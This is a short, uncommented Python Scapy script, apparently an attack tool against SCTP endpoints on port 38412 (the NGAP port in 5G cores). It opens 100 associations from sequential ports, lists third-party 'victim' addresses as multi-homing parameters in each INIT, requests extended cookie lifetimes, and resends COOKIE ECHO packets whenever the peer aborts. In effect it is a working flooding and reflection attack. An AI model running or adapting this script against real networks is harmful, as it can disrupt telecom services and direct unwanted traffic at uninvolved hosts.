from scapy.all import sendp, srp1, AsyncSniffer
from scapy.layers.inet import Ether, IP, Packet
from scapy.layers.sctp import (
    SCTP,
    SCTPChunkInit,
    SCTPChunkCookieEcho,
    SCTPChunkParamIPv4Addr,
    SCTPChunkParamCookiePreservative,
    SCTPChunkParamStateCookie,
)
from random import randint

network_interface = "eth0"
src_address = "192.0.2.1"
src_port = 40000
dst_address = "192.0.2.2"
dst_port = 38412
victim_addresses = ["192.0.2.3"]
number_of_associations = 100

eth_ip = Ether() / IP(src=src_address, dst=dst_address)


def rcv_pkt_callback(sniffer: AsyncSniffer, pkt: Packet, cookie_echo_pkt: Packet):
    sctp_pkt = pkt.lastlayer()
    if sctp_pkt.fields.get("type") == 6:
        sendp(cookie_echo_pkt, iface=network_interface)
    elif sctp_pkt.fields.get("type") == 9:
        sniffer.stop()
        src_port = pkt.getlayer(SCTP).fields.get("sport")
        dst_port = pkt.getlayer(SCTP).fields.get("dport")
        init_association(src_port, dst_port)


def create_init_chunk() -> SCTPChunkInit:
    params = []
    for address in victim_addresses:
        params.append(SCTPChunkParamIPv4Addr(addr=address))
    params.append(SCTPChunkParamCookiePreservative(sug_cookie_inc=6 * pow(10, 7)))
    return SCTPChunkInit(
        init_tag=randint(1, pow(2, 32) - 1),
        a_rwnd=pow(2, 16) - 1,
        n_in_streams=10,
        n_out_streams=10,
        init_tsn=randint(0, pow(2, 32) - 1),
        params=params
    )


chunk_init = create_init_chunk()


def init_association(src_port, dst_port):
    sctp = SCTP(sport=src_port, dport=dst_port, tag=0x0)
    init_pkt = eth_ip / sctp / chunk_init

    init_ack_pkt = srp1(init_pkt, iface=network_interface)
    init_ack_chunk = init_ack_pkt.lastlayer()
    init_ack_chunk_params = init_ack_chunk.fields.get("params")

    verification_tag = init_ack_chunk.fields.get("init_tag")
    cookie = SCTPChunkParamStateCookie(bytes(init_ack_chunk_params[0])).cookie
    sctp.fields["tag"] = verification_tag
    chunk_cookie_echo = SCTPChunkCookieEcho(cookie=cookie)
    cookie_echo_pkt = eth_ip / sctp / chunk_cookie_echo

    sendp(cookie_echo_pkt, iface=network_interface)
    sniffer = AsyncSniffer(
        iface=network_interface,
        prn=lambda pkt: rcv_pkt_callback(sniffer, pkt, cookie_echo_pkt),
        filter=f"src host {dst_address} and dst port {src_port}",
        store=0,
    )
    sniffer.start()


for x in range(number_of_associations):
    init_association(src_port + x, dst_port)
input("Press any key to exit.")
